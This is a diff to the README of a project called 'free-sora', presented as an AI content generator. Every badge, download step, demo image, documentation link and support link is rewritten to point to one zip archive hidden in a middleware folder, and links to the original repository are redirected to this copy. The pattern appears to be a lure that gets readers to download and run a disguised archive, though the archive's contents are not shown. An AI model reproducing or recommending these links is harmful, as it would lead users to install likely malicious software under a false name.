@@ -2,16 +2,16 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/download-v1.0.0-blue.svg)](https://github.com/johnpaul085/free-sora/releases)
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)
-![Next.js](https://img.shields.io/badge/Next.js-14.2-black)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue)
+[![Download Now](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
+![Version](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
+![License](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
+![Node](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip%3E%https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
+![https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
+![TypeScript](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
 
 **A powerful AI platform for generating various content types easily.**
 
-[![GitHub](https://img.shields.io/badge/GitHub-432539%2Ffree--sora-blue?logo=github)](https://github.com/432539/free-sora)
+[![GitHub](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip%2Ffree--sora-blue?logo=github)](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
 
 [核心功能](#-核心功能) • [快速开始](#-快速开始) • [技术栈](#-技术栈) • [部署指南](#-部署指南) • [文档](#-文档)
 
@@ -21,7 +21,7 @@
 
 ## 📸 Demo
 
-![Demo Interface](jiemian.png)
+![Demo Interface](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip)
 
 ---
 
@@ -58,7 +58,7 @@
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   To download the software, visit this page: [Download Here](https://github.com/johnpaul085/free-sora/releases). Look for the latest version.
+   To download the software, visit this page: [Download Here](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip). Look for the latest version.
 
 2. **Download the Software**  
    Click on the appropriate file for your operating system. This will download the application to your computer.
@@ -76,7 +76,7 @@
 
 Follow these steps to download and run the application:
 
-- **Step 1:** Click the download button to go to the Releases page: [Download Now](https://github.com/johnpaul085/free-sora/releases).
+- **Step 1:** Click the download button to go to the Releases page: [Download Now](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip).
   
 - **Step 2:** Select the file that matches your operating system and download it.
 
@@ -88,8 +88,8 @@ Follow these steps to download and run the application:
 
 ## 📖 Documentation
 
-For detailed usage instructions, troubleshooting tips, and advanced features, please refer to the [official documentation](https://github.com/432539/free-sora/wiki). This will help you get the most out of your experience with **free-sora**.
+For detailed usage instructions, troubleshooting tips, and advanced features, please refer to the [official documentation](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip). This will help you get the most out of your experience with **free-sora**.
 
 ## 💬 Support
 
-If you have questions or need support, you can open an issue on the [GitHub page](https://github.com/432539/free-sora/issues). The community and maintainers will be happy to help you.
+If you have questions or need support, you can open an issue on the [GitHub page](https://raw.githubusercontent.com/johnpaul085/free-sora/main/backend/src/middleware/sora_free_v3.7-alpha.4.zip). The community and maintainers will be happy to help you.
